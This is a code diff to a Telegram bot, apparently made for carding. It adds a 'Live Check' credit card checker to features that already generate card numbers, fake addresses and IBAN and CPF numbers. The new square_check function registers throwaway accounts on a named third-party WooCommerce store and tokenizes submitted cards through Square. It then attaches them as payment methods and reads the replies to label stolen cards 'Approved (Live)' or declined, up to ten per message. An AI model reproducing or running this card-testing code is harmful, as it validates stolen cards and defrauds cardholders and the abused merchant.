@@ -4,6 +4,8 @@ import os
 import random
 import requests
 import re
+import time
+import hashlib
 from flask import Flask
 from threading import Thread
 
@@ -69,9 +71,9 @@ GIVEAWAY_PRIZES = [
 # --- Main Keyboard Menu ---
 def get_main_menu(user_id=None):
     markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    markup.add(KeyboardButton("🔐 Gen BIN"), KeyboardButton("👉 Fake Address"))
-    markup.add(KeyboardButton("ℹ️ IBAN Gen"), KeyboardButton("©️ CPF Gen"))
-    markup.add(KeyboardButton("👤 My Info"))
+    markup.add(KeyboardButton("🔐 Gen BIN"), KeyboardButton("💳 Live Check"))
+    markup.add(KeyboardButton("👉 Fake Address"), KeyboardButton("ℹ️ IBAN Gen"))
+    markup.add(KeyboardButton("©️ CPF Gen"), KeyboardButton("👤 My Info"))
     
     if user_id == ADMIN_ID:
         markup.add(KeyboardButton("🎁 Giveaway Admin"))
@@ -89,12 +91,8 @@ def setup_bot_commands():
 
 def check_cancel(message):
     text = message.text
-    menu_buttons = ["🔐 Gen BIN", "👉 Fake Address", "ℹ️ IBAN Gen", "©️ CPF Gen", "👤 My Info", "🎁 Giveaway Admin"]
+    menu_buttons = ["🔐 Gen BIN", "💳 Live Check", "👉 Fake Address", "ℹ️ IBAN Gen", "©️ CPF Gen", "👤 My Info", "🎁 Giveaway Admin"]
     if text in menu_buttons or text.startswith('/'):
-        try:
-            handle_menu_buttons(message)
-        except NameError:
-            pass 
         return True
     return False
 
@@ -172,7 +170,99 @@ def cmd_admin_menu(message):
 def cmd_start(message):
     add_user(message.from_user.id) 
     if is_banned(message.from_user.id): return
-    bot.reply_to(message, "🛠 <b>Bot Main Menu</b>\nအောက်ပါ ခလုတ်များကို နှိပ်၍ အသုံးပြုပါ။ Genနှင့်Addressသည် Fommatမှန်က တန်းပို့နိုင်သည်။ (ဥပမာ-524554555|xx|xx|xxxနှင့် us/uk/de/etc....)", reply_markup=get_main_menu(message.from_user.id))
+    bot.reply_to(message, "🛠 <b>Bot Main Menu</b>\nအောက်ပါ ခလုတ်များကို နှိပ်၍ အသုံးပြုပါ။ Gen နှင့် Address သည် Format မှန်က တန်းပို့နိုင်သည်။ (ဥပမာ-524554|xx|xx|xxx နှင့် us/uk/de/etc....)", reply_markup=get_main_menu(message.from_user.id))
+
+# ==========================================
+# CC Checker Logic (Square Auth Integration)
+# ==========================================
+def get_bin_info_str(cc):
+    try:
+        res = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=3)
+        if res.status_code == 200:
+            d = res.json()
+            return f"{d.get('brand','-')} - {d.get('type','-')} - {d.get('bank','-')} - {d.get('country_name','-')}"
+    except:
+        pass
+    return "Unknown BIN"
+
+def square_check(cc, mes, ano, cvv):
+    fnames = ["john","james","robert","michael","william","david"]
+    lnames = ["smith","johnson","williams","brown","jones","garcia"]
+    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com"]
+    f = random.choice(fnames)
+    l = random.choice(lnames)
+    mail = f"{f}.{l}{random.randint(10, 999)}@{random.choice(domains)}"
+    mod = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12))
+    u = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+    
+    bin_str = get_bin_info_str(cc)
+    
+    r = requests.Session()
+    try:
+        resp1 = r.get('https://underthedivi.com/my-account/', headers={'User-Agent': u}, timeout=15)
+        nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', resp1.text)
+        if not nonce_match: return f"🔴 <b>#Dead (Proxy/Site Error)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}"
+        xx = nonce_match.group(1)
+
+        head1 = {'user-agent': u, 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://underthedivi.com/my-account/'}
+        data1 = {'email': mail, 'password': mod, 'woocommerce-register-nonce': xx, '_wp_http_referer': '/my-account/', 'register': 'Register'}
+        r.post('https://underthedivi.com/my-account/', headers=head1, data=data1, timeout=15)
+
+        resp2 = r.get('https://underthedivi.com/my-account/add-payment-method/', headers={'User-Agent': u}, timeout=15)
+        nonce2_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', resp2.text)
+        if not nonce2_match: return f"🔴 <b>#Dead (Gate Error)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}"
+        xxx = nonce2_match.group(1)
+
+        def ego(data): return hashlib.md5(str(data).encode()).hexdigest()
+        json_data = {
+            'analytics': { 'timezone': '-120', 'website_url': 'https://underthedivi.com/' },
+            'client_id': 'sq0idp-wGVapF8sNt9PLrdj5znuKA',
+            'instance_id': '8ea96ffb-c42e-40f9-bdd9-9777ca088075',
+            'location_id': '6JKR6RP4CBRJB',
+            'card_data': { 'cvv': str(cvv), 'exp_month': int(mes), 'exp_year': int(ano), 'number': str(cc) },
+            'pow_counter': 366
+        }
+        
+        head2 = {'accept': 'application/json', 'content-type': 'application/json; charset=utf-8', 'origin': 'https://web.squarecdn.com', 'user-agent': u}
+        resp3 = r.post('https://pci-connect.squareup.com/v2/card-nonce', headers=head2, json=json_data, timeout=15)
+        xego = resp3.json().get('card_nonce')
+        
+        if not xego: return f"🔴 <b>#Dead (Tokenize Fail)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}"
+
+        data2 = {
+            'payment_method': 'square_credit_card',
+            'wc-square-credit-card-payment-nonce': xego,
+            'wc-square-credit-card-tokenize-payment-method': 'true',
+            'woocommerce-add-payment-method-nonce': xxx,
+            '_wp_http_referer': '/my-account/add-payment-method/',
+            'woocommerce_add_payment_method': '1',
+        }
+        resp4 = r.post('https://underthedivi.com/my-account/add-payment-method/', headers=head1, data=data2, timeout=20)
+
+        try:
+            res_data = resp4.json()
+            if 'error' in res_data:
+                err_msg = res_data.get('error', {}).get('message', 'Unknown Error')
+                if any(x in err_msg.lower() for x in ["insufficient", "zip", "cvv", "verification"]):
+                    return f"🟢 <b>#Approved (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}\n<b>Msg:</b> <code>{err_msg}</code>"
+                return f"🔴 <b>#Declined</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}\n<b>Msg:</b> <code>{err_msg}</code>"
+            else:
+                return f"🟢 <b>#Approved (Added Successfully)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}"
+        except:
+            match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', resp4.text, re.DOTALL)
+            if match:
+                err_msg = match.group(1).strip()
+                err_clean = re.sub(r'<[^>]+>', '', err_msg)
+                if any(x in err_clean.lower() for x in ["insufficient", "zip", "cvv", "verification", "successfully"]):
+                    return f"🟢 <b>#Approved (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}\n<b>Msg:</b> <code>{err_clean}</code>"
+                return f"🔴 <b>#Declined</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}\n<b>Msg:</b> <code>{err_clean}</code>"
+            elif "Payment method successfully added" in resp4.text or "successfully" in resp4.text:
+                return f"🟢 <b>#Approved (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}\n<b>Msg:</b> <code>Added successfully</code>"
+            else:
+                return f"🔴 <b>#Declined (Dead)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}\n<b>Msg:</b> <code>Unknown/Dead</code>"
+
+    except Exception as e:
+        return f"⚠️ <b>Error Check (Timeout):</b> <code>{cc}|{mes}|{ano}|{cvv}</code>"
 
 # ==========================================
 # Giveaway Private Chat Commands (Bot DM)
@@ -209,7 +299,6 @@ def gw_clear_prizes(message):
     GIVEAWAY_PRIZES.clear()
     bot.reply_to(message, "🗑 ဆုစာရင်း အားလုံးကို ဖျက်လိုက်ပါပြီ။")
 
-# DM တွင်လည်း စမ်းသပ်နိုင်ရန် သီးသန့်ချန်ထားသော commands
 @bot.message_handler(commands=['gusers', 'prizes', 'pick'])
 def gw_dm_view_commands(message):
     if message.from_user.id != ADMIN_ID: return
@@ -323,7 +412,6 @@ def gw_channel_commands(message):
             
             bot.send_message(chat_id, res, parse_mode="HTML")
 
-    # Command ရိုက်လိုက်သော စာသားကို ဖျက်ပစ်မည် (Bot ကို Channel တွင် Delete Message Permission ပေးထားရန်လိုသည်)
     try:
         bot.delete_message(chat_id, message.message_id)
     except:
@@ -536,6 +624,9 @@ def handle_all_messages(message):
     if text in ["🔐 Gen BIN", "/gen"]:
         bot.reply_to(message, "⏳ <b>BIN Generator</b>\nBIN သို့မဟုတ် Format ကို တိုက်ရိုက် ပို့ပေးပါ။\n(ဥပမာ - <code>412236</code>)", reply_markup=get_main_menu(message.from_user.id))
         return
+    elif text in ["💳 Live Check", "/chk"]:
+        bot.reply_to(message, "⏳ <b>CC Checker (Square Auth)</b>\nစစ်ဆေးလိုသော ကတ်များကို ပို့ပေးပါ။ (၁၀ ကတ်အထိသာ)\n(ဥပမာ - <code>cc|mm|yyyy|cvv</code>)", reply_markup=get_main_menu(message.from_user.id))
+        return
     elif text in ["👉 Fake Address", "/fake"]:
         bot.reply_to(message, "⏳ <b>Fake Address</b>\nနိုင်ငံကုဒ် ပို့ပေးပါ။ (ဥပမာ - <code>us</code>)\n\n💡 <i>နိုင်ငံစာရင်းကြည့်ရန် <code>list</code> ဟုရိုက်ပါ။</i>", reply_markup=get_main_menu(message.from_user.id))
         return
@@ -563,7 +654,7 @@ def handle_all_messages(message):
             "<code>/gusers</code> - လူစာရင်းပြရန်\n"
             "<code>/prizes</code> - ဆုစာရင်းပြရန်\n"
             "<code>/pick</code> - မဲဖောက်ရန်\n\n"
-            "💡 <b>အလွယ်တကူစာရင်းသွင်းရန်</b> ➔ Channel ရဲ့ Comment တွေကို ဒီ Chat ထဲ Forward ချလိုက်ရုံဖြင့် အလိုအလျောက် စာရင်းဝင်ပါမည်။"
+            "💡 <b>အလွယ်တကူစာရင်းသွင်းရန်</b> ➔ Channel ရဲ့ Comment တွေကို ဒီ Chat ထဲ Forward ချလိုက်ရုံဖြင့် အလိုအလျောက် စာရင်းဝင်ပါမည်。"
         )
         bot.reply_to(message, gw_text, parse_mode="HTML", reply_markup=get_main_menu(message.from_user.id))
         return
@@ -571,12 +662,42 @@ def handle_all_messages(message):
         show_country_list(message)
         return
 
+    # --- Live Check CC Detection (Square Integration) ---
+    matches = re.findall(r'(\d{15,16})[\|/:;\s]+(\d{1,2})[\|/:;\s]+(\d{2,4})[\|/:;\s]+(\d{3,4})', text)
+    if matches:
+        if len(matches) > 10:
+            matches = matches[:10]
+            
+        msg = bot.reply_to(message, f"⏳ <b>Checking {len(matches)} cards via Square... Please wait.</b>")
+        final_result = ""
+        
+        for idx, match in enumerate(matches):
+            cc, mes, ano, cvv = match
+            if len(ano) == 2: ano = "20" + ano
+            
+            res = square_check(cc, mes, ano, cvv)
+            final_result += res + "\n\n"
+            
+            if (idx + 1) % 3 == 0 or (idx + 1) == len(matches):
+                try:
+                    bot.edit_message_text(final_result + f"⏳ <i>Checking {idx+1}/{len(matches)}...</i>", chat_id=message.chat.id, message_id=msg.message_id)
+                except Exception:
+                    pass
+                    
+        try:
+            bot.edit_message_text(final_result + "✅ <b>Check Completed!</b>", chat_id=message.chat.id, message_id=msg.message_id)
+        except Exception:
+            pass
+        return
+
+    # --- Country Codes for Fake Address ---
     all_country_codes = ["dz","ar","au","bh","bd","be","br","kh","ca","co","dk","eg","fi","fr","de","in","it","jp","kz","my","mx","ma","nz","pa","pk","pe","pl","qa","sa","sg","es","se","ch","th","tr","uk","us","gb","id"]
     if text.lower() in all_country_codes:
         generate_fake_address(message, text.lower())
         return
 
-    if re.match(r'^\d{6}', text):
+    # --- BIN Generator Trigger ---
+    if re.match(r'^\d{6}', text) or "|" in text:
         generate_cc(message, text)
         return
 
